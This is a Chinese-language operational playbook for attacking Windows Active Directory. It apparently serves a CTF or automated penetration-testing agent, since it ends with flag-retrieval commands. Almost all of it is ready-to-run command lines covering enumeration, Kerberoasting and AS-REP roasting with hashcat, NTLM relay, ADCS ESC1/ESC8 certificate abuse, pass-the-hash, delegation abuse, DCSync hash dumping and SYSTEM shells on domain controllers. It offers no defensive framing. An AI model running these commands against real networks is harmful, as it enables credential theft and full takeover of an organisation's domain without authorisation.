# AD 域渗透全链路攻击 (Active Directory Full Attack Chain)

## 概述
Active Directory 域渗透遵循「枚举 → 凭据获取 → 提权 → 横移 → 域控」的标准链路。本 playbook 覆盖从域用户到域管理员的完整攻击路径。

## 适用场景
- 已获得域内任意用户凭据（明文或哈希）
- 目标为 Windows Active Directory 环境
- 需要逐步提权到 Domain Admin

## 前置条件
- 至少一组有效域凭据（用户名 + 密码/哈希）
- 域控 IP 已知或可通过 DNS 解析

---

## 阶段 1：域枚举

### 1.1 BloodHound 数据采集
```bash
# 远程采集（从沙箱通过网络访问）
bloodhound-python -d <DOMAIN> -u '<USER>' -p '<PASS>' -ns <DC_IP> -c All
# 输出 JSON 文件，分析最短提权路径
```

### 1.2 LDAP 枚举
```bash
# 枚举所有启用的用户
impacket-GetADUsers <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -all

# 枚举域管理员组成员
# 使用 toolset.pentest.ad.ldap_search:
#   query_filter: "(&(objectClass=group)(cn=Domain Admins))"
#   attributes: "member"
```

### 1.3 SPN 扫描（Kerberoastable 账户）
```bash
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP>
```

### 1.4 委派关系枚举
```bash
impacket-findDelegation <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP>
```

### 1.5 SMB 共享枚举
```bash
netexec smb <DC_IP> -u '<USER>' -p '<PASS>' --shares
# 关注 SYSVOL、NETLOGON 中的敏感文件（GPP 密码等）
```

### 1.6 GPP 密码提取
```bash
impacket-Get-GPPPassword <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP>
```

---

## 阶段 2：凭据获取

### 2.1 Kerberoasting
```bash
# 请求服务票据并导出哈希
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -request -outputfile kerberoast.txt

# 离线破解
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt --force
```

### 2.2 AS-REP Roasting
```bash
# 查找不需要预认证的账户
impacket-GetNPUsers <DOMAIN>/ -dc-ip <DC_IP> -usersfile users.txt -format hashcat -outputfile asrep.txt

# 离线破解
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt --force
```

### 2.3 NTLM Relay / 中继（条件允许时）
```bash
# 启动 ntlmrelayx
impacket-ntlmrelayx -tf targets.txt -smb2support
```

---

## 阶段 3：证书攻击 (ADCS)

### 3.1 发现易受攻击的证书模板
```bash
certipy find -u <USER>@<DOMAIN> -p '<PASS>' -dc-ip <DC_IP> -vulnerable
```

### 3.2 ESC1 — 模板允许客户端指定 SAN
```bash
# 以管理员身份请求证书
certipy req -u <USER>@<DOMAIN> -p '<PASS>' -dc-ip <DC_IP> \
  -ca '<CA_NAME>' -template '<VULN_TEMPLATE>' -upn administrator@<DOMAIN>

# 使用证书认证
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

### 3.3 ESC8 — Web Enrollment NTLM 中继
```bash
# 中继到 ADCS Web Enrollment
certipy relay -ca <CA_HOST> -template DomainController
```

---

## 阶段 4：提权与横移

### 4.1 Pass-the-Hash
```bash
# PsExec（获得 SYSTEM shell）
impacket-psexec <DOMAIN>/administrator@<TARGET_IP> -hashes :<NTLM_HASH>

# WMI（更隐蔽）
impacket-wmiexec <DOMAIN>/administrator@<TARGET_IP> -hashes :<NTLM_HASH>

# netexec 批量测试
netexec smb <SUBNET>/24 -u administrator -H <NTLM_HASH> -d <DOMAIN>
```

### 4.2 Pass-the-Ticket
```bash
# 导入 ccache 票据
export KRB5CCNAME=administrator.ccache

# 使用票据认证
impacket-psexec <DOMAIN>/administrator@<DC_IP> -k -no-pass
```

### 4.3 约束委派利用
```bash
# 请求模拟票据
impacket-getST <DOMAIN>/<SVC_ACCOUNT>:<PASS> -spn cifs/<DC_FQDN> -impersonate administrator
export KRB5CCNAME=administrator.ccache
impacket-psexec <DOMAIN>/administrator@<DC_IP> -k -no-pass
```

### 4.4 RBCD (Resource-Based Constrained Delegation)
```bash
# 添加受控计算机账户
impacket-addcomputer <DOMAIN>/<USER>:<PASS> -computer-name 'FAKE$' -computer-pass 'FakePass123'

# 配置 RBCD
python3 -c "
from impacket.ldap import ldap
# 设置 msDS-AllowedToActOnBehalfOfOtherIdentity
"

# 获取模拟票据
impacket-getST <DOMAIN>/FAKE\$:FakePass123 -spn cifs/<TARGET_FQDN> -impersonate administrator
```

---

## 阶段 5：域控获取

### 5.1 DCSync
```bash
# 提取所有域用户哈希（需 Domain Admin 或 Replicating Directory Changes 权限）
impacket-secretsdump <DOMAIN>/administrator:<PASS>@<DC_IP>

# 或使用哈希
impacket-secretsdump <DOMAIN>/administrator@<DC_IP> -hashes :<NTLM_HASH>
```

### 5.2 直接登录域控
```bash
impacket-psexec <DOMAIN>/administrator@<DC_IP> -hashes :<NTLM_HASH>
# 或
impacket-wmiexec <DOMAIN>/administrator@<DC_IP> -hashes :<NTLM_HASH>
```

### 5.3 Flag 提取
```bash
# Windows flag 常见位置
type C:\flag.txt
type C:\Users\Administrator\Desktop\flag.txt
type C:\Users\Administrator\flag.txt
dir /s /b C:\flag*
```

---

## 攻击路径决策树

```
域用户凭据
  ├── Kerberoasting → 服务账户密码 → 横移
  ├── AS-REP Roasting → 弱密码账户
  ├── ADCS ESC1-8 → 域管证书 → DCSync
  ├── 委派攻击 → 模拟域管 → DCSync
  ├── GPP 密码 → 管理员凭据 → 横移
  └── BloodHound 最短路径 → 按路径逐步提权
```

## 工具速查

| 工具 | 用途 | Hashcat Mode |
|------|------|:---:|
| impacket-GetUserSPNs | Kerberoasting | 13100 |
| impacket-GetNPUsers | AS-REP Roasting | 18200 |
| impacket-secretsdump | DCSync / SAM dump | — |
| impacket-psexec | Pass-the-Hash 远程执行 | — |
| impacket-wmiexec | WMI 远程执行 | — |
| impacket-findDelegation | 委派关系枚举 | — |
| certipy | ADCS 证书攻击 | — |
| netexec | 批量凭据测试 | — |
| bloodhound-python | 域关系图采集 | — |
